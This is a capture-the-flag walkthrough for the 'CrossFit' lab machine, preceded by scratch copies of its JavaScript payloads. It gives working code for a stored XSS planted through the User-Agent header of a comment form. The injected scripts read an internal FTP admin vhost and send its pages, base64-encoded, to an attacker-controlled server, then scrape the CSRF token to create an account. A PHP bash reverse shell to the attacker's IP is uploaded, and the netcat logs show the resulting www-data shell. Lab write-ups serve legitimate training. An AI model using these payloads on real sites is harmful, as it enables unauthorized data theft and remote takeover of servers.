//////////////////

myhttpserver = 'http://10.10.69.69/'
targeturl = 'http://ftp.crossfit.htb/'

req = new XMLHttpRequest;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
            req2 = new XMLHttpRequest;
            req2.open('GET', myhttpserver + btoa(this.responseText),false);
            req2.send();
        }
}
req.open('GET', targeturl, false);
req.send();

//////////////////

myhttpserver = 'http://10.10.69.69/'
targeturl = 'http://ftp.crossfit.htb/accounts/create'

req = new XMLHttpRequest;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
            req2 = new XMLHttpRequest;
            req2.open('GET', myhttpserver + btoa(this.responseText),false);
            req2.send();
        }
}
req.open('GET', targeturl, false);
req.send();

//////////////////

myhttpserver = 'http://10.10.69.69'
targeturl = 'http://ftp.crossfit.htb/accounts/create'
username = 'thing'
password = 'thing'

req = new XMLHttpRequest;
req.withCredentials = true;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
        req2 = new XMLHttpRequest;
        req2.open('GET', myhttpserver + btoa(this.responseText), false);
        req2.send();
    }
}

////////////////////////////////////
////////////////////////////////////
//
//  https://fdlucifer.github.io/2020/11/28/crossfit/
//

req.open('GET', targeturl, false);
req.send();

regx = /token" value="(.*)"/g;
token = regx.exec(req.responseText)[1];

var params = '_token=' + token + '&username=' + username + '&pass=' + password + '&submit=submit'
req.open('POST', "http://ftp.crossfit.htb/accounts", false);
req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
req.send(params);

//////////////////

Now i try everything but nothing work so think about other ways that we need to attack ftp.crossfit.htb.

But the question is where he find that subdomain.

After some hit and try i understand that we need to find that from localhost (using XSS) can see another vhost that only accepts resquest from the local machine and the host is ftp.crossfit.htb that thinking about.

    Create a HTTP Request in JS

With the help of this article i find my way to communicate with ftp.crossfit.htb.

So what we do now we create a .js file called luci.js that give the response page of the ftp.crossfit.htb in our python server.

Let’s try this real quick.
step 1

Create a file called luci.js

    luci.js

myhttpserver = 'http://10.10.14.8/'
targeturl = 'http://ftp.crossfit.htb/'

req = new XMLHttpRequest;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
            req2 = new XMLHttpRequest;
            req2.open('GET', myhttpserver + btoa(this.responseText),false);
            req2.send();
        }
}
req.open('GET', targeturl, false);
req.send();

step 2

Open a python simple http server in your working directory were the luci.js file exist.

python3 -m http.server 80

Now capture the request of comment form and send it to the repeater tab and add the value that show in the image.

<script src="http://10.10.14.8/luci.js"></script>

burp request:

POST /blog-single.php HTTP/1.1

Host: gym-club.crossfit.htb

User-Agent: <script src="http://10.10.14.8/luci.js"></script>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 93

Origin: http://gym-club.crossfit.htb

Connection: close

Referer: http://gym-club.crossfit.htb/blog-single.php

Upgrade-Insecure-Requests: 1



name=lucifer11&email=1185151867%40qq.com&phone=17746608760&message=%3Cscript%3E&submit=submit

Let’s send the request and check our python server.

┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.208 - - [28/Nov/2020 08:45:54] "GET /luci.js HTTP/1.1" 200 -
10.10.10.208 - - [28/Nov/2020 08:45:55] code 404, message File not found
10.10.10.208 - - [28/Nov/2020 08:45:55] "GET /PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+RlRQIEhvc3RpbmcgLSBBY2NvdW50IE1hbmFnZW1lbnQ8L3RpdGxlPgogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvdHdpdHRlci1ib290c3RyYXAvNC4wLjAtYWxwaGEvY3NzL2Jvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CjwvaGVhZD4KPGJvZHk+Cgo8YnI+CjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctMTIgbWFyZ2luLXRiIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icHVsbC1sZWZ0Ij4KICAgICAgICAgICAgICAgIDxoMj5GVFAgSG9zdGluZyAtIEFjY291bnQgTWFuYWdlbWVudDwvaDI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJwdWxsLXJpZ2h0Ij4KICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MiIGhyZWY9Imh0dHA6Ly9mdHAuY3Jvc3NmaXQuaHRiL2FjY291bnRzL2NyZWF0ZSI+IENyZWF0ZSBOZXcgQWNjb3VudDwvYT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgICAKICAgIDx0YWJsZSBjbGFzcz0idGFibGUgdGFibGUtYm9yZGVyZWQiPgogICAgICAgIDx0cj4KICAgICAgICAgICAgPHRoPk5vPC90aD4KICAgICAgICAgICAgPHRoPlVzZXJuYW1lPC90aD4KICAgICAgICAgICAgPHRoPkNyZWF0aW9uIERhdGU8L3RoPgogICAgICAgICAgICA8dGggd2lkdGg9IjI4MHB4Ij5BY3Rpb248L3RoPgogICAgICAgIDwvdHI+CgogICAgICAgIAogICAgPC90YWJsZT4KCiAgICAKCjwvZGl2PgoKPC9ib2R5Pgo8L2h0bWw+Cg== HTTP/1.1" 404 -

It give us a base64 string.

Let’s decode this and see what inside.

<!DOCTYPE html>

<html>
<head>
    <title>FTP Hosting - Account Management</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css" rel="stylesheet">
</head>
<body>

<br>
<div class="container">
        <div class="row">
        <div class="col-lg-12 margin-tb">
            <div class="pull-left">
                <h2>FTP Hosting - Account Management</h2>
            </div>
            <div class="pull-right">
                <a class="btn btn-success" href="http://ftp.crossfit.htb/accounts/create"> Create New Account</a>
            </div>
        </div>
    </div>

    
    <table class="table table-bordered">
        <tr>
            <th>No</th>
            <th>Username</th>
            <th>Creation Date</th>
            <th width="280px">Action</th>
        </tr>

        
    </table>

    

</div>

</body>
</html>

It’s a html code for ftp.crossfit.htb wepsite.

If you not conform Let’s open this in browser.

It’s a FTP Hosting - Account Management page.

Let’s create new user.

But first Let’s check what is the url when we click on create new account.

http://ftp.crossfit.htb/accounts/create

let’s add this in our luci.js and check how’s the page look on ftp.crossfit.htb/accounts/create

luci.js

myhttpserver = 'http://10.10.14.8/'
targeturl = 'http://ftp.crossfit.htb/accounts/create'

req = new XMLHttpRequest;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
            req2 = new XMLHttpRequest;
            req2.open('GET', myhttpserver + btoa(this.responseText),false);
            req2.send();
        }
}
req.open('GET', targeturl, false);
req.send();

Let’s send the request again in burp.

And we got the response.

┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.208 - - [28/Nov/2020 08:55:42] "GET /luci.js HTTP/1.1" 200 -
10.10.10.208 - - [28/Nov/2020 08:55:42] code 404, message File not found
10.10.10.208 - - [28/Nov/2020 08:55:42] "GET /PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+RlRQIEhvc3RpbmcgLSBBY2NvdW50IE1hbmFnZW1lbnQ8L3RpdGxlPgogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvdHdpdHRlci1ib290c3RyYXAvNC4wLjAtYWxwaGEvY3NzL2Jvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CjwvaGVhZD4KPGJvZHk+Cgo8YnI+CjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAKPGRpdiBjbGFzcz0icm93Ij4KICAgIDxkaXYgY2xhc3M9ImNvbC1sZy0xMiBtYXJnaW4tdGIiPgogICAgICAgIDxkaXYgY2xhc3M9InB1bGwtbGVmdCI+CiAgICAgICAgICAgIDxoMj5BZGQgTmV3IEFjY291bnQ8L2gyPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InB1bGwtcmlnaHQiPgogICAgICAgICAgICA8YSBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiBocmVmPSJodHRwOi8vZnRwLmNyb3NzZml0Lmh0Yi9hY2NvdW50cyI+IEJhY2s8L2E+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9kaXY+CgoKPGZvcm0gYWN0aW9uPSJodHRwOi8vZnRwLmNyb3NzZml0Lmh0Yi9hY2NvdW50cyIgbWV0aG9kPSJQT1NUIj4KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Il90b2tlbiIgdmFsdWU9IkJobURaQWlMN0JDc01kbnRvOXIwTnlyVW5yTldQcFhZRE1HbEVtQ08iPgogICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIGNvbC1zbS0xMiBjb2wtbWQtMTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICAgIDxzdHJvbmc+VXNlcm5hbWU6PC9zdHJvbmc+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHBsYWNlaG9sZGVyPSJVc2VybmFtZSI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiBjb2wtc20tMTIgY29sLW1kLTEyIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgICAgICA8c3Ryb25nPlBhc3N3b3JkOjwvc3Ryb25nPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIgY29sLXNtLTEyIGNvbC1tZC0xMiB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+U3VibWl0PC9idXR0b24+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCjwvZm9ybT4KCjwvZGl2PgoKPC9ib2R5Pgo8L2h0bWw+Cg== HTTP/1.1" 404 -

Again decode it and open in browser.

<!DOCTYPE html>

<html>
<head>
    <title>FTP Hosting - Account Management</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css" rel="stylesheet">
</head>
<body>

<br>
<div class="container">
    
<div class="row">
    <div class="col-lg-12 margin-tb">
        <div class="pull-left">
            <h2>Add New Account</h2>
        </div>
        <div class="pull-right">
            <a class="btn btn-primary" href="http://ftp.crossfit.htb/accounts"> Back</a>
        </div>
    </div>
</div>


<form action="http://ftp.crossfit.htb/accounts" method="POST">
    <input type="hidden" name="_token" value="BhmDZAiL7BCsMdnto9r0NyrUnrNWPpXYDMGlEmCO">
     <div class="row">
        <div class="col-xs-12 col-sm-12 col-md-12">
            <div class="form-group">
                <strong>Username:</strong>
                <input type="text" name="username" class="form-control" placeholder="Username">
            </div>
        </div>
        <div class="col-xs-12 col-sm-12 col-md-12">
            <div class="form-group">
                <strong>Password:</strong>
                <input type="password" name="pass" class="form-control" placeholder="Password">
            </div>
        </div>
        <div class="col-xs-12 col-sm-12 col-md-12 text-center">
                <button type="submit" class="btn btn-primary">Submit</button>
        </div>
    </div>

</form>

</div>

</body>
</html>

There is two field username and password.

But the tricky part is if you see the source code there is a hidden value called _token which value dynamically change so if we create a payload to register user we need to grep the _token value from web page.

After some hit and try create a payload to register user.

createuser.js

myhttpserver = 'http://10.10.14.8'
targeturl = 'http://ftp.crossfit.htb/accounts/create'
username = 'luci'
password = 'lucifer11'

req = new XMLHttpRequest;
req.withCredentials = true;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
        req2 = new XMLHttpRequest;
        req2.open('GET', myhttpserver + btoa(this.responseText), false);
        req2.send();
    }
}
req.open('GET', targeturl, false);
req.send();

regx = /token" value="(.*)"/g;
token = regx.exec(req.responseText)[1];

var params = '_token=' + token + '&username=' + username + '&pass=' + password + '&submit=submit'
req.open('POST', "http://ftp.crossfit.htb/accounts", false);
req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
req.send(params);

Now send the req in burp with this createuser.js file like this.

<script src="http://10.10.14.8/createuser.js"></script>

POST /blog-single.php HTTP/1.1

Host: gym-club.crossfit.htb

User-Agent: <script src="http://10.10.14.8/createuser.js"></script>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 93

Origin: http://gym-club.crossfit.htb

Connection: close

Referer: http://gym-club.crossfit.htb/blog-single.php

Upgrade-Insecure-Requests: 1



name=lucifer11&email=1185151867%40qq.com&phone=17746608760&message=%3Cscript%3E&submit=submit

Let’s check the python listner.

and receive the response:

10.10.10.208 - - [28/Nov/2020 09:05:09] "GET /createuser.js HTTP/1.1" 200 -

And i use lftp to connect with ftp.

┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# lftp
lftp :~> set ftp:ssl-force true
lftp :~> connect 10.10.10.208
lftp 10.10.10.208:~> set ssl:verify-certificate no 
lftp 10.10.10.208:~> login luci
密码: 
lftp luci@10.10.10.208:~> ls
drwxrwxr-x    2 33       1002         4096 Sep 21 09:45 development-test
drwxr-xr-x   13 0        0            4096 May 07  2020 ftp
drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
drwxr-xr-x    2 0        0            4096 May 01  2020 html
lftp luci@10.10.10.208:/>

We find another sub-domain called: development-test.crossfit.htb

Let’s add this in our /etc/hosts file.

If you closely see that we have read and write access of development-test directory.

So that mean we can upload a php reverse shell and execute it with our rev.js file.
step 1

Create a file called rev.php.

rev.php

<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.8/9988 0>&1'") ?>

step 2

Create another file called rev.js that will execute our rev.php.

rev.js

req = new XMLHttpRequest;
req.open('GET',"http://development-test.crossfit.htb/rev.php");
req.send();

step 3

Start you python server on the same directory were all files exist and netcat Listener.

┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# ls
createuser.js  luci.js  rev.js  rev.php
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

┌──(root💀kali)-[~]
└─# nc -lvp 9988
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9988
Ncat: Listening on 0.0.0.0:9988

step 4

upload the rev.php in ftp development-test directory.

┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# lftp                                                                                                      
lftp :~> set ftp:ssl-force true
lftp :~> connect 10.10.10.208
lftp 10.10.10.208:~> set ssl:verify-certificate no
lftp 10.10.10.208:~> login luci
密码: 
lftp luci@10.10.10.208:~> ls
drwxrwxr-x    2 33       1002         4096 Sep 21 09:45 development-test
drwxr-xr-x   13 0        0            4096 May 07  2020 ftp
drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
drwxr-xr-x    2 0        0            4096 May 01  2020 html
lftp luci@10.10.10.208:/> cd development-test
lftp luci@10.10.10.208:/development-test> ls
lftp luci@10.10.10.208:/development-test> put rev.php
69 bytes transferred in 12 seconds (6 B/s)       
lftp luci@10.10.10.208:/development-test> ls
-rw-r--r--    1 1002     1002           69 Nov 28 14:30 rev.php

step 5

Go to burp repeater tab and edit it to rev.js and send it:

POST /blog-single.php HTTP/1.1

Host: gym-club.crossfit.htb

User-Agent: <script src="http://10.10.14.8/rev.js"></script>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://gym-club.crossfit.htb

Connection: close

Referer: http://gym-club.crossfit.htb/blog-single.php

Upgrade-Insecure-Requests: 1



name=dcasdc&email=casdcasdcd%40qq.com&phone=17746608760&message=%3Cscript%3E&submit=submit

Now let’s see our netcat listner

10.10.10.208 - - [28/Nov/2020 09:29:23] "GET /rev.js HTTP/1.1" 200 -

┌──(root💀kali)-[~]
└─# nc -lvp 9988
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9988
Ncat: Listening on 0.0.0.0:9988
Ncat: Connection from 10.10.10.208.
Ncat: Connection from 10.10.10.208:37118.
id
bash: cannot set terminal process group (712): Inappropriate ioctl for device
bash: no job control in this shell
www-data@crossfit:/var/www/development-test$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@crossfit:/var/www/development-test$ whoami
whoami
www-data

Boom we got the shell as www-data.

////////////////////////////////////////////////
//
//
